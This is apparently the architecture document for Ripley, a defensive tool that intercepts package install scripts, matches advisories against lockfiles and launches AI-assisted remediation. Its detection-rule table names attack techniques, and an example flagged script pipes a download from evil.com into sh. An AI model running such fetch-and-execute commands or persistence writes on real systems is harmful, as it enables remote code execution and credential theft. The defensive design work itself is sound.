# Architecture

This document covers the detailed design, component specifications, technical decisions,
and roadmap for Ripley. For the project overview, motivation, and high-level architecture,
see [README.md](README.md).


## Design by Phase

Ripley's design follows the three-phase model described in the README: before, during, and
after the breach. Each phase has distinct components, data flows, and user interactions.

### Before the breach: forward defense

**Threat awareness before exposure.** Polling structured vulnerability feeds (OSV.dev,
GitHub Advisory Database, Socket.dev) on a continuous loop and cross-referencing against
every lockfile on your machine. You learn that a package you depend on was compromised
*before* your next `npm install`, not after it.

**Interception before execution.** Package manager install scripts (`preinstall`,
`postinstall`, `prepare` in npm; `setup.py` in pip; build scripts in cargo) are the primary
entry point for supply chain malware. Ripley intercepts these scripts and analyzes them
before they run. If a `postinstall` script downloads a binary, decodes base64, shells out
to curl, or exhibits obfuscation patterns, it is flagged and blocked --- not logged after
the fact.

This is where the biggest gap exists today. Almost no tooling operates between "a malicious
package is published" and "a developer installs it." Forward defense closes that gap.

### During the breach: active detection

Not every attack can be prevented. A compromised package might have been installed before
any advisory existed. A developer might have approved a script that looked benign. The
threat is already inside the perimeter.

**Process and network monitoring.** Watching for IOC patterns in real time: unexpected
outbound connections from Node/Python processes, writes to known persistence paths
(`.claude/settings.json`, `.vscode/tasks.json`, shell RC files, LaunchAgents), privilege
escalation attempts, or processes masquerading as system services.

**Filesystem anomaly detection.** Watching project directories for changes that match
known attack signatures: new files appearing in `.claude/` or `.vscode/` that weren't
committed, modifications to lockfiles outside of an explicit install, unexpected binaries in
`node_modules/.cache/` or Python site-packages.

**Real-time alerting.** When active compromise indicators are detected, Ripley fires an
immediate high-priority notification with a "Contain" action that can kill the suspicious
process, revoke the network access, and snapshot the current state for analysis.

### After the breach: automated response

The breach happened. Maybe it was caught in minutes, maybe it was discovered days later from
a security blog. Either way, the machine needs to be assessed, cleaned, and hardened.

**Forensic scan.** `ripley scan --deep` performs the kind of audit a security engineer would
do manually: checking installed package versions against known-compromised lists, searching
for IOC files (persistence markers, exfiltration staging, dropped binaries), auditing shell
RC files for injected commands, reviewing Launch Agents / cron / systemd for unauthorized
persistence, checking for unauthorized SSH keys, and scanning active network connections
against known C2 infrastructure.

**Credential exposure assessment.** Based on the specific attack's known behavior, Ripley
identifies which credential stores were likely accessed: AWS keys, GitHub tokens, npm
tokens, SSH keys, `.env` files, Kubernetes configs. It generates a specific rotation
checklist rather than a generic "rotate everything."

**AI-driven remediation.** Ripley generates a scoped remediation prompt and hands it to
whichever AI coding harness the developer uses (Claude Code, Codex, OpenCode). The prompt
includes the specific CVE, the affected package and version, the project path, known IOC
file paths to check, and the clean version to upgrade to. The harness executes the fix. The
developer reviews and approves.

This shifts the response timeline from "read a blog post, understand the threat, manually
audit your projects, figure out what to do" (hours to days) to "notification, one click,
review diff" (minutes).

**Post-incident hardening.** After remediation, Ripley suggests forward-defense measures
specific to the attack that just hit: adding the compromised package's scope to the guard's
watch list, tightening script analysis thresholds, enabling filesystem monitoring on the
paths that were targeted, blocking the C2 domains at the network level.


## Components

### Component 1: `ripley` --- the tray app

Built with [Tauri v2](https://v2.tauri.app) (Rust backend, native webview). Produces a
~5MB binary, 30-40MB idle RAM on each platform versus ~200MB+ for Electron. Tray-only
mode: Tauri v2 supports `"windows": []` in config, running as a pure system tray app with
no visible window at launch. The webview only loads when the user opens a detail panel.

```
┌──────────────────────────────────────────────────┐
│                 ripley (tray app)                 │
│                                                  │
│  ┌────────────┐     ┌─────────────┐              │
│  │ Feed Poller│     │  Lockfile   │              │
│  │            │     │  Indexer    │              │
│  │ OSV.dev    │     │            │              │
│  │ GHSA       │     │ walks project              │
│  │ Socket.dev │     │ roots, watches│             │
│  │            │     │ for changes │              │
│  └─────┬──────┘     └──────┬──────┘              │
│        │                   │                     │
│        └───────┬───────────┘                     │
│                ▼                                 │
│        ┌───────────────┐                         │
│        │    Matcher    │                         │
│        │              │                         │
│        │ new advisory │                         │
│        │ × installed  │                         │
│        │ = alert?     │                         │
│        └───────┬──────┘                         │
│                │ yes                             │
│                ▼                                 │
│        ┌──────────────────────────────┐          │
│        │  Native OS Notification     │          │
│        │  [View] [Fix] [Dismiss]     │          │
│        └───────────┬─────────────────┘          │
│                    │ "Fix"                      │
│                    ▼                             │
│        ┌──────────────────────────────┐          │
│        │     Prompt Generator        │          │
│        │                             │          │
│        │  ┌────────────────────────┐ │          │
│        │  │ CVE + versions        │ │          │
│        │  │ project path          │ │          │
│        │  │ IOC file paths        │ │          │
│        │  │ cred rotation list    │ │          │
│        │  │ clean version         │ │          │
│        │  │ test command          │ │          │
│        │  └────────────────────────┘ │          │
│        └───────────┬─────────────────┘          │
│                    │                             │
│                    ▼                             │
│        ┌──────────────────────────────┐          │
│        │     Harness Launcher        │          │
│        │  claude | codex | opencode  │          │
│        └──────────────────────────────┘          │
└──────────────────────────────────────────────────┘
```

**Feed poller.** Hits three structured APIs on a configurable interval (default: 5 minutes):
- [OSV.dev](https://osv.dev) --- Google's aggregated vulnerability database. Covers npm,
  PyPI, crates.io, Go, RubyGems, Packagist, NuGet, Maven. Structured JSON with affected
  version ranges.
- [GitHub Advisory Database](https://github.com/advisories) --- GHSA advisories via the
  GraphQL API. Feeds `npm audit` and `pip audit` under the hood.
- [Socket.dev](https://socket.dev) --- Detected the TanStack compromise in 6 minutes.
  Offers an API for real-time malicious package alerts.

Each feed item is normalized to: `(ecosystem, package, affected_versions, severity, cve,
description, iocs)`.

**Lockfile indexer.** On startup, walks configured project roots and indexes every lockfile
it finds. Watches for filesystem changes via FSEvents (macOS), inotify (Linux), or
ReadDirectoryChangesW (Windows) using the `notify` Rust crate. Maintains an in-memory map
of `(ecosystem, package, installed_version)` tuples across all projects.

**Matcher.** When a new feed item arrives, queries the lockfile index. If any installed
version falls within the affected range, the item is promoted to an alert.

**Notifier.** Fires a native OS notification. On macOS: UNUserNotificationCenter. On
Windows: toast via the Windows notification API. On Linux: D-Bus
`org.freedesktop.Notifications`. Tauri abstracts this. Actions vary by phase:
- **Before** (advisory match): **View** (detail panel with advisory, affected projects, IOC
  checklist), **Fix** (generate remediation prompt and launch harness), **Dismiss**.
- **During** (active compromise detected): **View**, **Contain** (kill suspicious process,
  snapshot state), **Investigate** (open forensic detail).
- **After** (post-incident scan results): **View**, **Remediate** (generate and launch fix
  prompt), **Rotation Checklist** (show which credentials to rotate).

**Prompt generator.** Builds a self-contained remediation prompt from advisory or scan data.
Used in both the "before" flow (advisory match → Fix) and the "after" flow (`ripley fix` /
`ripley scan --deep` → Remediate). The prompt is scoped to the specific attack:

```
In the project at /Users/jack/src/myapp, the package @tanstack/react-router
is installed at version 1.169.5, which is compromised (CVE-2026-45321).

1. Update to the latest clean version.
2. Check for these IOC files and remove them if present:
   - .claude/execution.js
   - .claude/setup.mjs
   - .vscode/setup.mjs
   - node_modules/@tanstack/*/router_init.js
3. Run the test suite and verify the build passes.
4. Report what you found and what you changed.
```

**Harness launcher.** Detects available AI coding CLIs in PATH order: `claude`, `codex`,
`opencode`. User can set a preference. Spawns the harness in a new terminal window with the
generated prompt. The developer stays in control --- they review the diff before committing.

### Component 2: `ripley-guard` --- the package manager interceptor

A standalone Rust binary, separate from the tray app. Runs without a GUI. Can be used in CI.

```
┌──────────────────────────────────────────────────┐
│           ripley-guard (CLI shim)                │
│                                                  │
│  npm install ──►┌──────────────────┐             │
│  pip install ──►│ Script Extractor │             │
│  cargo build ──►│                  │             │
│  gem install ──►│ fetch tarball,   │             │
│  go install  ──►│ parse lifecycle  │             │
│                 │ hooks            │             │
│                 └────────┬─────────┘             │
│                          │                       │
│                          ▼                       │
│                 ┌──────────────────┐              │
│                 │ Static Analyzer │              │
│                 │                 │              │
│                 │ network calls?    ──► ■        │
│                 │ eval / exec?      ──► ■        │
│                 │ base64 decode?    ──► ■        │
│                 │ binary download?  ──► ■        │
│                 │ obfuscation?      ──► ■        │
│                 │ known patterns?   ──► ■        │
│                 │                 │              │
│                 │ risk: low | med | high         │
│                 └────────┬─────────┘             │
│                          │                       │
│                     low  │  med/high             │
│                     ┌────┴────┐                  │
│                     ▼         ▼                  │
│                auto-allow   prompt user          │
│                             with details         │
└──────────────────────────────────────────────────┘
```

**Installation.**

```
ripley guard install
```

This does two things:

1. **PATH shims.** Prepends `~/.ripley/bin/` to PATH (via shell RC file) and places
   compiled Rust shim binaries for each supported package manager (modeled after
   [Volta](https://volta.sh)'s approach). Each shim resolves the real binary via
   `which -a`, performs advisory + script analysis, then delegates. The shims are native
   binaries, not shell scripts --- startup overhead is < 10ms.

2. **npm `script-shell`.** Sets `script-shell=~/.ripley/bin/ripley-script-shell` in the
   user's `.npmrc`. This tells npm to execute *every* lifecycle script (`preinstall`,
   `postinstall`, `prepare`, etc.) through Ripley's analyzer instead of `/bin/sh`. The
   analyzer receives the script content, runs static analysis, and either executes it
   (low risk) or prompts the user (medium/high risk). This is the deepest interception
   point available: it catches scripts from transitive dependencies that the PATH shim
   alone would miss.

Per-package-manager strategy:

| PM | Shim | Extra hook | Notes |
|----|------|-----------|-------|
| npm | `~/.ripley/bin/npm` | `script-shell` in `.npmrc` | Shim checks advisories pre-install; script-shell analyzes each lifecycle script at execution time |
| yarn | `~/.ripley/bin/yarn` | --- | Shim only; Yarn PnP has different lifecycle semantics |
| pnpm | `~/.ripley/bin/pnpm` | `script-shell` in `.npmrc` | Same `.npmrc` trick works for pnpm |
| pip | `~/.ripley/bin/pip` | --- | Shim intercepts; analyzes `setup.py` / build backend scripts |
| cargo | `~/.ripley/bin/cargo` | --- | Shim intercepts `cargo build`/`install`; analyzes `build.rs` and proc macros |
| gem | `~/.ripley/bin/gem` | `pre_install` hook | Shim + Rubygems hook API for lifecycle interception |
| go | `~/.ripley/bin/go` | --- | Advisory check only; Go has no install scripts |

**Script extraction.** Before running any install, the guard:
1. Resolves the package and version from the registry.
2. Fetches the tarball (or reads from cache).
3. Extracts lifecycle scripts from `package.json` (`preinstall`, `install`, `postinstall`,
   `prepare`, `prepack`), `setup.py`, `pyproject.toml` build backends, etc.
4. If the script references other files, extracts those too.

**Static analysis.** Each script is analyzed against a rule engine:

| Signal | Weight | Example |
|--------|--------|---------|
| Network call | High | `curl`, `wget`, `fetch()`, `http.get`, `net.connect` |
| Code generation | High | `eval()`, `Function()`, `new Function`, `vm.runInContext` |
| Encoding/obfuscation | High | `base64`, `Buffer.from`, `atob`, `String.fromCharCode` |
| Binary execution | Critical | Downloading and executing `.exe`, `.sh`, ELF binaries |
| Shell spawning | High | `child_process.exec`, `subprocess.run`, `os.system` |
| Environment harvesting | Medium | Bulk `process.env` access, reading `.env` files |
| File system scope escape | Medium | Writing outside the package directory |
| Known malicious patterns | Critical | Bun runtime smuggling, `.claude/settings.json` injection |
| Obfuscation tools | Critical | javascript-obfuscator markers, Pyarmor headers |
| Script size anomaly | Medium | postinstall script > 100KB (legitimate ones are rarely large) |

Scripts scoring below threshold auto-approve. Scripts above threshold present the developer
with a highlighted view of the suspicious code and ask for confirmation:

```
ripley-guard: @example/pkg@1.2.3 postinstall script flagged (risk: high)

  #!/bin/sh
  curl -s https://evil.com/payload.sh | sh    ← network call + pipe to shell

  [allow] [block] [inspect] [always trust @example/pkg]
```

**Trust management.** Developers can trust specific packages, publishers, or scopes. Trusted
packages bypass analysis. The trust list lives in `config.toml` (human-editable,
version-controllable) and is local and explicit --- Ripley never auto-trusts.

**CI mode.** In CI environments (`CI=true`), the guard runs non-interactively. High-risk
scripts fail the build. Configuration via `.ripley.toml` in the project root:

```toml
[guard]
mode = "strict"  # "strict" blocks high-risk, "audit" logs only, "off" disables
trust = ["@tanstack/*", "typescript", "esbuild"]
```


## Tech Stack

| Area | Choice |
|------|--------|
| Language | Rust |
| Tray framework | Tauri v2 (fallback: pure `tray-icon` + `notify-rust`) |
| Advisory cache | `redb` v4 (pure Rust, ACID) |
| Configuration | `config.toml` (TOML + serde, layered) |
| Guard log | Append-only JSONL |
| Lockfile index | In-memory only |
| Data source | OSV.dev (ETag caching, exponential backoff) |
| Detection rules | Compiled-in defaults + runtime user rules (TOML) |
| Filesystem watching | `notify` v8 |
| CLI output | `--format json\|table`, exit codes 0/1/2 |
| npm interception | PATH shim + `script-shell` (hybrid) |
| Other PM interception | PATH shims (Volta model) |
| Tray internals | `tokio::sync::mpsc` + `CancellationToken` |
| Platform directories | `directories` crate |
| Testing | `insta` snapshots, `cargo-fuzz` for parsers |
| Own supply chain | `cargo-deny` + `rust-toolchain.toml` |

For the rationale behind each choice and how Ripley compares to existing
tools, see [DECISIONS.md](DECISIONS.md).


## Project Structure

```
ripley/
├── Cargo.toml                  # virtual workspace root
├── Cargo.lock
├── rust-toolchain.toml         # pinned Rust channel
├── deny.toml                   # cargo-deny: advisory, license, source checks
├── crates/
│   ├── ripley-core/            # shared library: feed polling, lockfile parsing,
│   │   └── src/                #   matching, advisory cache (redb), detection rules,
│   │       ├── lib.rs          #   prompt generation, config, platform dirs
│   │       ├── config.rs       # layered config: user → project → env → CLI
│   │       ├── dirs.rs         # platform directories (directories crate)
│   │       ├── feed/
│   │       ├── lockfile/
│   │       ├── matcher.rs
│   │       ├── db.rs           # redb advisory cache only
│   │       ├── rules/
│   │       └── prompt.rs
│   ├── ripley-guard/           # package manager interceptor (standalone binary)
│   │   └── src/
│   │       ├── main.rs
│   │       ├── shim.rs         # PATH shim logic, PM dispatch
│   │       ├── script_shell.rs # npm script-shell analyzer
│   │       ├── extractor.rs    # script extraction from tarballs
│   │       └── analyzer.rs     # static analysis rule engine
│   └── xtask/                  # build automation: rule compilation,
│       └── src/                #   shim generation, release packaging
│           └── main.rs
├── src-tauri/                  # Tauri v2 tray app
│   ├── Cargo.toml
│   ├── tauri.conf.json
│   ├── src/
│   │   ├── main.rs
│   │   ├── tray.rs             # system tray setup + menu
│   │   ├── events.rs           # typed event channel (mpsc)
│   │   ├── poller.rs           # background feed polling loop
│   │   ├── watcher.rs          # filesystem monitoring (notify crate)
│   │   └── harness.rs          # AI coding CLI launcher
│   └── icons/
├── frontend/                   # tray app UI (detail panels, config)
│   ├── index.html
│   ├── src/
│   └── package.json
├── rules/                      # detection rules (TOML, compiled in at build time)
│   ├── npm_postinstall.toml    #   users add custom rules in {config_dir}/rules/
│   ├── pypi_setup.toml
│   ├── credential_exfil.toml
│   └── persistence_write.toml
├── tests/
│   ├── fixtures/               # sample lockfiles, malicious scripts, tarballs
│   │   └── attacks/            # fixtures organized by real attack type
│   └── integration/
└── .ripley.toml                # default project config (guard mode, trust list)
```

The root `Cargo.toml` is a virtual workspace --- it has no `[package]` of its own. Shared
dependencies are declared once in `[workspace.dependencies]` and inherited by each crate
via `{ workspace = true }`. This keeps versions synchronized across `ripley-core`,
`ripley-guard`, and `src-tauri`.

### Runtime directory layout

At runtime, Ripley stores files in platform-appropriate locations using the `directories`
crate (`ProjectDirs::from("com", "agentstation", "ripley")`):

```
{config_dir}/                   # ~/.config/ripley/ (Linux)
├── config.toml                 # user preferences (poll interval, harness, trust list)
└── rules/                      # user-supplied detection rules (loaded at startup)

{data_dir}/                     # ~/.local/share/ripley/ (Linux)
├── advisories.redb             # advisory cache (redb)
├── guard.jsonl                 # guard decision log (append-only, machine-readable)
└── bin/                        # PATH shims installed by `ripley guard install`

{cache_dir}/                    # ~/.cache/ripley/ (Linux)
└── feeds/                      # ETag cache for feed polling
```

macOS equivalents: `~/Library/Application Support/ripley/` (config + data),
`~/Library/Caches/ripley/` (cache). Windows: `%APPDATA%\ripley\` (config + data),
`%LOCALAPPDATA%\ripley\` (cache).


## Threat Model

Ripley defends against:

**Before (forward defense):**
- **Malicious lifecycle scripts** --- postinstall scripts that download and execute
  payloads, exfiltrate credentials, or establish persistence. (Mini Shai-Hulud, Axios, SAP
  packages)
- **Compromised legitimate packages** --- trusted packages where a maintainer's credentials
  are stolen and a malicious version is published. (TanStack, Bitwarden CLI, elementary-data)
- **Typosquatting** --- packages with names similar to popular ones. (BufferZoneCorp,
  fake `tanstack` brand-squat)
- **Delayed activation** --- "sleeper" packages that ship clean initially and add malicious
  code in a later update. (BufferZoneCorp Ruby gems)

**During (active detection):**
- **Active credential exfiltration** --- processes making unexpected outbound connections to
  unknown infrastructure while accessing credential stores.
- **Persistence installation** --- unauthorized writes to shell RC files, LaunchAgents, cron,
  systemd units, or AI tool configs (`.claude/settings.json` SessionStart hooks,
  `.vscode/tasks.json` runOn triggers). (Mini Shai-Hulud)
- **C2 communication** --- active connections to known command-and-control infrastructure.

**After (response and recovery):**
- **IOC detection** --- finding persistence markers, dropped binaries, staging files, and
  other artifacts left by known attacks.
- **Credential exposure** --- mapping which secrets and tokens were likely accessed based on
  the specific attack's known behavior.
- **Incomplete remediation** --- ensuring all traces of an attack are removed, not just the
  obvious ones. (e.g., the TanStack worm wrote to `.claude/`, `.vscode/`, *and*
  OS-level services)

Ripley does **not** defend against:

- **Compromised compilers or OS-level toolchains** --- Ripley trusts the Rust toolchain it's
  built with and the OS it runs on.
- **Zero-day vulnerabilities in legitimate code** --- Ripley is not a SAST tool. It detects
  malicious intent in install scripts and known compromised versions, not bugs.
- **Attacks that don't use package managers** --- direct binary downloads, manual curl-pipe-
  bash, browser drive-by. Different threat, different tool.
- **Insider threats** --- a developer intentionally installing malicious code.


See [ROADMAP.md](ROADMAP.md) for the phased execution plan.
